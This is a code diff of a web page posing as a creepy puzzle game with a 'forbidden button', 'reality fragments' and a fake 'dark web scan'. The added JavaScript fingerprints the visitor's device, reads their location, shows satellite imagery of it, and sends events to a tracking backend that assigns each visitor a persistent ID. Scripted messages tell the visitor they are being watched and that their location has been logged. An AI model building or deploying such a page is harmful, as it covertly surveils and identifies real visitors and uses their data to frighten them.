-                navigator.clipboard.writeText(coords);
-                logToStream('📋 Coordinates copied to clipboard');
-                alert('📍 Coordinates copied: ' + coords);
-            }
-        }
-
-        // ==================== SYSTEM INFO ====================
-        function collectSystemInfo() {
-            const systemData = {
+        // ==================== SYSTEM FINGERPRINT ====================
+        async function collectSystemInfo() {
+            systemInfo = {
                 platform: navigator.platform,
                 browser: navigator.userAgent,
-                cores: navigator.hardwareConcurrency,
-                memory: navigator.deviceMemory || '?',
+                cores: navigator.hardwareConcurrency || 'Unknown',
+                memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'Unknown',
                 screen: `${screen.width}x${screen.height}`,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 language: navigator.language,
                 cookies: navigator.cookieEnabled,
-                doNotTrack: navigator.doNotTrack,
+                doNotTrack: navigator.doNotTrack || 'Not set',
                 timestamp: new Date().toISOString()
             };
 
+            // Generate unique fingerprint
+            const fingerprint = await generateFingerprint();
+            
             document.getElementById('sysInfo').innerHTML = `
-Platform: ${systemData.platform}<br>
-Browser: ${systemData.browser.substring(0, 60)}...<br>
-CPU Cores: ${systemData.cores}<br>
-RAM: ${systemData.memory}GB<br>
-Screen: ${systemData.screen}<br>
-Timezone: ${systemData.timezone}<br>
-Language: ${systemData.language}<br>
-Cookies: ${systemData.cookies ? 'Enabled' : 'Disabled'}<br>
-Do Not Track: ${systemData.doNotTrack || 'Not set'}
+                <strong>Platform:</strong> ${systemInfo.platform}<br>
+                <strong>Browser:</strong> ${systemInfo.browser.substring(0, 50)}...<br>
+                <strong>CPU Cores:</strong> ${systemInfo.cores}<br>
+                <strong>RAM:</strong> ${systemInfo.memory}<br>
+                <strong>Screen:</strong> ${systemInfo.screen}<br>
+                <strong>Timezone:</strong> ${systemInfo.timezone}<br>
+                <strong>Language:</strong> ${systemInfo.language}<br>
+                <strong>Cookies:</strong> ${systemInfo.cookies ? 'Enabled' : 'Disabled'}<br>
+                <strong>Do Not Track:</strong> ${systemInfo.doNotTrack}
             `;
 
-            sendToBackend('system', systemData);
+            document.getElementById('fingerprintHash').innerHTML = `FP: ${fingerprint}`;
+            
+            return systemInfo;
+        }
+
+        async function generateFingerprint() {
+            const components = [
+                systemInfo.platform,
+                systemInfo.screen,
+                systemInfo.timezone,
+                systemInfo.cores,
+                systemInfo.language
+            ].join('|');
+            
+            const encoder = new TextEncoder();
+            const data = encoder.encode(components);
+            const hash = await crypto.subtle.digest('SHA-256', data);
+            return Array.from(new Uint8Array(hash)).slice(0, 8).map(b => b.toString(16).padStart(2, '0')).join('');
         }
 
         // ==================== DEEP SCAN ====================
-        async function deepScan() {
-            logToStream('🔬 Performing deep system scan...');
+        document.getElementById('deepScan').addEventListener('click', async () => {
+            const hardwareDiv = document.getElementById('hardwareInfo');
+            hardwareDiv.style.display = 'block';
             
-            let batteryInfo = 'Unknown';
-            if ('getBattery' in navigator) {
-                const battery = await navigator.getBattery();
-                batteryInfo = `${Math.round(battery.level * 100)}% ${battery.charging ? '(Charging)' : ''}`;
-            }
+            const scanData = {
+                ...systemInfo,
+                plugins: navigator.plugins ? Array.from(navigator.plugins).map(p => p.name).slice(0, 5) : [],
+                mimeTypes: navigator.mimeTypes ? navigator.mimeTypes.length : 0,
+                maxTouchPoints: navigator.maxTouchPoints,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory,
+                connection: navigator.connection ? {
+                    type: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt
+                } : 'Unknown'
+            };
 
-            let connectionInfo = 'Unknown';
-            if ('connection' in navigator) {
-                const conn = navigator.connection;
-                connectionInfo = `${conn.effectiveType || '?'} - ${conn.downlink || '?'}Mbps`;
-            }
-
-            document.getElementById('sysInfo').innerHTML += `
-<br><br><b>DEEP SCAN RESULTS:</b><br>
-Battery: ${batteryInfo}<br>
-Connection: ${connectionInfo}<br>
-GPU: ${getGPUInfo()}<br>
-Touch Points: ${navigator.maxTouchPoints}<br>
-Online: ${navigator.onLine ? 'Yes' : 'No'}
+            hardwareDiv.innerHTML = `
+                <strong>🔬 DEEP SCAN RESULTS:</strong><br><br>
+                <strong>Plugins:</strong> ${scanData.plugins.length} detected<br>
+                <strong>MIME Types:</strong> ${scanData.mimeTypes}<br>
+                <strong>Touch Points:</strong> ${scanData.maxTouchPoints}<br>
+                <strong>Connection:</strong> ${scanData.connection.type || 'Unknown'}<br>
+                <strong>Downlink:</strong> ${scanData.connection.downlink || '?'} Mbps<br>
+                <strong>RTT:</strong> ${scanData.connection.rtt || '?'} ms<br>
             `;
 
-            updateThreatLevel(15);
-            addToTimeline('🔬 Deep system scan performed');
+            await sendToBackend('deep_scan', scanData);
+            addFragment();
+            showToast('Deep scan complete', 'info');
+        });
+
+        // ==================== FORBIDDEN BUTTON ====================
+        const buttonMessages = [
+            "Why did you do that?",
+            "They're watching now.",
+            "The button is bleeding.",
+            "Check your surroundings.",
+            "Only 5 presses left...",
+            "You shouldn't have done that.",
+            "They know your name.",
+            "It's too late now.",
+            "The screen is glitching.",
+            "Behind you.",
+            "Your location has been logged.",
+            "Camera access requested.",
+            "Microphone activated.",
+            "Data transmission in progress.",
+            "Threat level rising."
+        ];
+
+        document.getElementById('forbiddenButton').addEventListener('click', async () => {
+            buttonPresses++;
+            
+            document.getElementById('pressHistory').innerHTML = `Presses: ${buttonPresses}`;
+            document.getElementById('buttonStatus').className = 'status-badge status-offline';
+            document.getElementById('buttonStatus').textContent = `PRESSED ${buttonPresses}`;
+            
+            const message = buttonMessages[Math.min(buttonPresses - 1, buttonMessages.length - 1)];
+            document.getElementById('buttonMessages').innerHTML = message;
+            
+            // Update threat level
+            updateThreatLevel(5 + buttonPresses);
+            
+            // Special effects
+            if (buttonPresses === 3) {
+                document.body.style.animation = 'corrupt 0.5s';
+                setTimeout(() => document.body.style.animation = '', 500);
+                addFragment();
+            }
+            
+            if (buttonPresses === 6) {
+                createGlitchEffect();
+                addFragment();
+            }
+            
+            if (buttonPresses === 9) {
+                document.getElementById('buttonMessages').innerHTML = '⚠️ COORDINATES REVEALED: 60.233, 24.866 ⚠️';
+                updateThreatLevel(30);
+                addFragment();
+            }
+            
+            if (buttonPresses === 13) {
+                document.getElementById('buttonMessages').innerHTML = '💀 SYSTEM BREACH DETECTED 💀';
+                updateThreatLevel(50);
+            }
+
+            await sendToBackend('button', {
+                presses: buttonPresses,
+                message: message
+            });
+        });
+
+        // ==================== REALITY FRAGMENTS ====================
+        function createPuzzlePieces() {
+            const container = document.getElementById('puzzlePieces');
+            container.innerHTML = '';
+            
+            for (let i = 1; i <= 9; i++) {
+                const piece = document.createElement('div');
+                piece.className = `puzzle-piece ${fragments.includes(i) ? 'found' : 'missing'}`;
+                piece.dataset.fragment = i;
+                piece.onclick = () => collectFragment(i);
+                container.appendChild(piece);
+            }
         }
 
-        function getGPUInfo() {
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl');
-                if (gl) {
-                    return gl.getParameter(gl.RENDERER);
+        async function collectFragment(num) {
+            if (!fragments.includes(num)) {
+                fragments.push(num);
+                fragments.sort((a, b) => a - b);
+                
+                createPuzzlePieces();
+                document.getElementById('fragmentsFound').innerHTML = `${fragments.length}/9 fragments collected`;
+                document.getElementById('fragmentStatus').textContent = `${fragments.length}/9`;
+                
+                await sendToBackend('fragment', { fragment: num });
+                
+                if (fragments.length === 9) {
+                    document.getElementById('fragmentMessage').innerHTML = '⚠️ ALL FRAGMENTS ASSEMBLED - REALITY BREACH IMMINENT ⚠️';
+                    updateThreatLevel(50);
+                    showToast('Reality fragments assembled!', 'warning');
                 }
-            } catch (e) {}
-            return 'Unknown';
+            }
         }
+
+        function addFragment() {
+            for (let i = 1; i <= 9; i++) {
+                if (!fragments.includes(i)) {
+                    collectFragment(i);
+                    break;
+                }
+            }
+        }
+
+        // ==================== DARK WEB SCAN ====================
+        document.getElementById('scanDarkWeb').addEventListener('click', async () => {
+            document.getElementById('darkWebData').innerHTML = '<span class="loading"></span> Scanning dark web...';
+            
+            const darkWebData = [
+                `> Your location: ${currentLocation ? `${currentLocation.lat.toFixed(4)}, ${currentLocation.lon.toFixed(4)}` : 'Unknown'}`,
+                `> Device fingerprint: ${await generateFingerprint()}`,
+                `> Browser: ${systemInfo.browser.substring(0, 30)}...`,
+                `> OS: ${systemInfo.platform}`,
+                `> Data found in ${Math.floor(Math.random() * 10) + 1} databases`,
+                `> Estimated value: $${Math.floor(Math.random() * 100)}.${Math.floor(Math.random() * 99)}`,
+                `> Threat level: ${threatLevel}%`,
+                `> Recommended action: ${threatLevel > 70 ? 'Immediate evacuation' : 'Monitor'}`
+            ];
+            
+            setTimeout(() => {
+                document.getElementById('darkWebData').innerHTML = darkWebData.join('<br>');
+                document.getElementById('darkWebThreat').innerHTML = threatLevel > 50 ? '⚠️ Your data is being traded' : '';
+                updateThreatLevel(10);
+            }, 2000);
+        });
+
+        // ==================== SATELLITE FEED ====================
+        function updateSatelliteImage(lat, lon) {
+            // Using ESRI satellite imagery
+            const zoom = 18;
+            const x = Math.floor((lon + 180) / 360 * Math.pow(2, zoom));
+            const y = Math.floor((1 - Math.log(Math.tan(lat * Math.PI/180) + 1/Math.cos(lat * Math.PI/180)) / Math.PI) / 2 * Math.pow(2, zoom));
+            
+            document.getElementById('satelliteImage').src = `https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/${zoom}/${y}/${x}`;
+            document.getElementById('satelliteInfo').innerHTML = `📍 ${lat.toFixed(6)}, ${lon.toFixed(6)} | Zoom: ${zoom}`;
+        }
+
+        document.getElementById('refreshSatellite').addEventListener('click', () => {
+            if (currentLocation) {
+                updateSatelliteImage(currentLocation.lat, currentLocation.lon);
+            }
+        });
+
+        // ==================== ENCRYPTED TRANSMISSIONS ====================
+        const transmissions = [
+            "INCOMING: Location data transmitted",
+            "INCOMING: System fingerprint stored",
+            "INCOMING: Threat level updated",
+            "INCOMING: Fragment collected",
+            "INCOMING: Dark web scan complete",
+            "CLASSIFIED: Multiple sources tracking",
+            "WARNING: Pattern detected"
+        ];
+
+        document.getElementById('newTransmission').addEventListener('click', () => {
+            const transmission = transmissions[Math.floor(Math.random() * transmissions.length)];
+            const time = new Date().toLocaleTimeString();
+            
+            const div = document.getElementById('transmissions');
+            div.innerHTML = `[${time}] ${transmission}<br>` + div.innerHTML;
+            
+            if (Math.random() > 0.7) {
+                updateThreatLevel(2);
+            }
+        });
+
+        // Start automatic transmissions
+        transmissionInterval = setInterval(() => {
+            document.getElementById('newTransmission').click();
+        }, 30000);
 
         // ==================== THREAT SYSTEM ====================
         function updateThreatLevel(increase) {
             threatLevel = Math.min(100, threatLevel + increase);
             document.getElementById('threatLevel').textContent = threatLevel;
+            document.getElementById('timelineProgress').style.width = threatLevel + '%';
             
+            let message = '';
             if (threatLevel < 30) {
-                document.getElementById('threatMessage').textContent = 'LOW - SCANNING';
+                message = 'LOW - SCANNING';
+                document.getElementById('threatIndicator').style.borderColor = '#0f0';
             } else if (threatLevel < 60) {
-                document.getElementById('threatMessage').textContent = 'MEDIUM - WATCHING';
+                message = 'MEDIUM - WATCHING';
+                document.getElementById('threatIndicator').style.borderColor = 'yellow';
             } else if (threatLevel < 90) {
-                document.getElementById('threatMessage').textContent = 'HIGH - TRACKING';
+                message = 'HIGH - TRACKING';
+                document.getElementById('threatIndicator').style.borderColor = 'orange';
             } else {
-                document.getElementById('threatMessage').textContent = 'CRITICAL - DETECTED';
+                message = 'CRITICAL - DETECTED';
+                document.getElementById('threatIndicator').style.borderColor = 'red';
             }
+            
+            document.getElementById('threatMessage').textContent = message;
+            document.getElementById('timelineEvent').textContent = message;
+            
+            // Update threat analysis
+            document.getElementById('threatAnalysis').innerHTML = `
+                Current Level: ${threatLevel}%<br>
+                Status: ${message}<br>
+                Recommendation: ${threatLevel > 70 ? 'IMMEDIATE ACTION REQUIRED' : 'Continue monitoring'}<br>
+                Sources: ${Math.floor(threatLevel / 10) + 1} tracking systems
+            `;
 
-            sendToBackend('threat', { level: threatLevel, message: document.getElementById('threatMessage').textContent });
-        }
-
-        // ==================== PUZZLE FRAGMENTS ====================
-        function initFragments() {
-            const container = document.getElementById('fragmentContainer');
-            for (let i = 0; i < 9; i++) {
-                const fragment = document.createElement('div');
-                fragment.className = 'fragment';
-                fragment.onclick = () => collectFragment(i + 1);
-                container.appendChild(fragment);
-            }
-        }
-
-        function collectFragment(num) {
-            if (puzzlePieces < 9) {
-                puzzlePieces++;
-                document.getElementById('fragmentsFound').textContent = `${puzzlePieces}/9`;
-                
-                const fragments = document.querySelectorAll('.fragment');
-                fragments[puzzlePieces - 1].classList.add('found');
-
-                sendToBackend('fragment', { fragment: puzzlePieces });
-                addToTimeline(`🧩 Fragment ${puzzlePieces} collected`);
-
-                if (puzzlePieces === 9) {
-                    alert('⚠️ ALL FRAGMENTS COLLECTED - REALITY BREACH DETECTED');
-                    updateThreatLevel(50);
-                }
+            if (threatLevel > 70) {
+                sendToBackend('threat', { level: threatLevel, message: message });
             }
         }
 
-        // ==================== TIMELINE ====================
-        function addToTimeline(event) {
-            const timeline = document.getElementById('timelinePanel');
-            const time = new Date().toLocaleTimeString();
-            timeline.innerHTML = `[${time}] ${event}<br>` + timeline.innerHTML;
-        }
+        // ==================== LOCATION ACTIONS ====================
+        document.getElementById('copyCoordinates').addEventListener('click', () => {
+            if (currentLocation) {
+                const coords = `${currentLocation.lat.toFixed(6)}, ${currentLocation.lon.toFixed(6)}`;
+                navigator.clipboard.writeText(coords);
+                showToast('Coordinates copied!', 'success');
+            }
+        });
 
-        // ==================== DATA STREAM ====================
-        function logToStream(message) {
-            const stream = document.getElementById('dataStream');
-            const time = new Date().toLocaleTimeString();
-            stream.innerHTML = `[${time}] ${message}<br>` + stream.innerHTML;
-        }
+        document.getElementById('openMaps').addEventListener('click', () => {
+            if (currentLocation) {
+                window.open(`https://www.google.com/maps?q=${currentLocation.lat},${currentLocation.lon}`, '_blank');
+            }
+        });
+
+        document.getElementById('openStreetView').addEventListener('click', () => {
+            if (currentLocation) {
+                window.open(`https://www.google.com/maps?q=${currentLocation.lat},${currentLocation.lon}&layer=c`, '_blank');
+            }
+        });
+
+        document.getElementById('refreshLocation').addEventListener('click', getExactLocation);
 
         // ==================== BACKEND COMMUNICATION ====================
         async function sendToBackend(type, data) {
             try {
-                await fetch(`${BACKEND_URL}/api/track`, {
+                const response = await fetch(`${BACKEND_URL}/api/track`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -643,64 +1080,146 @@ Online: ${navigator.onLine ? 'Yes' : 'No'}
                         userAgent: navigator.userAgent
                     })
                 });
-            } catch (e) {
-                console.log('Backend error:', e);
+                
+                const result = await response.json();
+                
+                if (result.user_id && !userId) {
+                    userId = result.user_id;
+                    document.getElementById('userId').innerHTML = `ID: ${userId.substring(0, 8)}...`;
+                }
+                
+                if (result.is_new && type === 'system') {
+                    showToast('New identity registered', 'info');
+                }
+                
+                return result;
+            } catch (error) {
+                console.error('Backend error:', error);
+                return null;
             }
         }
 
-        // ==================== SECRET REVEAL ====================
-        function revealSecret() {
-            const secrets = [
-                "The button knows where you live...",
-                "Check the coordinates 60.233, 24.866",
-                "They are watching through your camera",
-                "Your location has been logged",
-                "The fragments are assembling"
-            ];
-            alert(secrets[Math.floor(Math.random() * secrets.length)]);
-            updateThreatLevel(10);
+        async function getStats() {
+            try {
+                const response = await fetch(`${BACKEND_URL}/api/stats`);
+                const stats = await response.json();
+                document.getElementById('totalUsers').textContent = stats.total_users || '---';
+            } catch (error) {
+                console.error('Stats error:', error);
+            }
         }
 
-        // ==================== INITIALIZATION ====================
-        document.addEventListener('DOMContentLoaded', () => {
-            initFragments();
-            collectSystemInfo();
-            
-            // Get exact location immediately
-            setTimeout(getExactLocation, 1000);
-            
-            // Update time
+        // ==================== UTILITY FUNCTIONS ====================
+        function startDataStream() {
             setInterval(() => {
-                document.getElementById('systemTime').textContent = `TIME: ${new Date().toLocaleTimeString()}`;
+                const stream = document.getElementById('dataStream');
+                const hex = Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0');
+                const types = ['GPS', 'SYS', 'FRAG', 'THRT', 'DARK'];
+                const type = types[Math.floor(Math.random() * types.length)];
+                const data = `[${new Date().toLocaleTimeString()}] [${type}:${hex}] ${Math.random().toString(36).substring(7)}...\n`;
+                stream.innerHTML = data + stream.innerHTML;
+                if (stream.innerHTML.length > 2000) {
+                    stream.innerHTML = stream.innerHTML.substring(0, 2000);
+                }
+            }, 500);
+        }
+
+        function initMatrixRain() {
+            const canvas = document.getElementById('matrixCanvas');
+            const ctx = canvas.getContext('2d');
+            
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+
+            const chars = '01010101010101010101アイウエオカキクケコ';
+            const columns = canvas.width / 20;
+            const drops = [];
+
+            for (let i = 0; i < columns; i++) {
+                drops[i] = Math.floor(Math.random() * canvas.height);
+            }
+
+            function draw() {
+                ctx.fillStyle = 'rgba(0, 0, 0, 0.04)';
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+                ctx.fillStyle = '#0f0';
+                ctx.font = '15px monospace';
+
+                for (let i = 0; i < drops.length; i++) {
+                    const text = chars[Math.floor(Math.random() * chars.length)];
+                    ctx.fillText(text, i * 20, drops[i]);
+
+                    if (drops[i] > canvas.height && Math.random() > 0.975) {
+                        drops[i] = 0;
+                    }
+                    drops[i] += 20;
+                }
+            }
+
+            setInterval(draw, 35);
+        }
+
+        function updateTime() {
+            setInterval(() => {
+                document.getElementById('systemTime').textContent = `> TIME: ${new Date().toLocaleString()}`;
             }, 1000);
+        }
+
+        function createGlitchEffect() {
+            const cards = document.querySelectorAll('.puzzle-card');
+            cards.forEach(card => {
+                card.style.animation = 'corrupt 0.3s';
+                setTimeout(() => card.style.animation = '', 300);
+            });
+        }
+
+        function showToast(message, type = 'info') {
+            const container = document.getElementById('toastContainer');
+            const toast = document.createElement('div');
+            toast.className = 'toast';
+            toast.innerHTML = message;
             
-            // Random online users
-            setInterval(() => {
-                document.getElementById('onlineUsers').textContent = Math.floor(Math.random() * 9000 + 1000);
-            }, 5000);
-        });
+            const colors = {
+                success: '#0f0',
+                error: '#f00',
+                warning: '#ff0',
+                info: '#0ff'
+            };
+            
+            toast.style.borderColor = colors[type] || '#0f0';
+            container.appendChild(toast);
+            
+            setTimeout(() => {
+                toast.style.animation = 'slideOut 0.3s';
+                setTimeout(() => toast.remove(), 300);
+            }, 3000);
+        }
 
-        // Event listeners
-        document.getElementById('refreshLocation').addEventListener('click', getExactLocation);
-        document.getElementById('copyCoordinates').addEventListener('click', copyCoordinates);
-        document.getElementById('deepScan').addEventListener('click', deepScan);
-        
-        document.getElementById('scanTimeline').addEventListener('click', () => {
-            const events = [
-                `📍 ${new Date().toLocaleDateString()}: Location tracked`,
-                `💻 System fingerprint captured`,
-                `🧩 ${puzzlePieces}/9 fragments collected`,
-                `⚠️ Threat level: ${threatLevel}%`
+        window.revealSecret = () => {
+            const secrets = [
+                "The button knows...",
+                "Check at midnight...",
+                "60.233, 24.866",
+                "They're behind you",
+                "Your screen is glitching",
+                "The truth is out there",
+                "Follow the fragments"
             ];
-            document.getElementById('timelinePanel').innerHTML = events.map(e => `[${new Date().toLocaleTimeString()}] ${e}`).join('<br>');
-        });
+            const secret = secrets[Math.floor(Math.random() * secrets.length)];
+            alert(`🔮 ${secret}`);
+            addFragment();
+        };
 
-        // Auto-refresh location every 5 minutes
-        setInterval(() => {
-            if (document.visibilityState === 'visible') {
-                getExactLocation();
+        // Cleanup on page unload
+        window.addEventListener('beforeunload', () => {
+            if (watchId) {
+                navigator.geolocation.clearWatch(watchId);
             }
-        }, 300000);
+            if (transmissionInterval) {
+                clearInterval(transmissionInterval);
+            }
+        });
     </script>
 </body>
 </html>
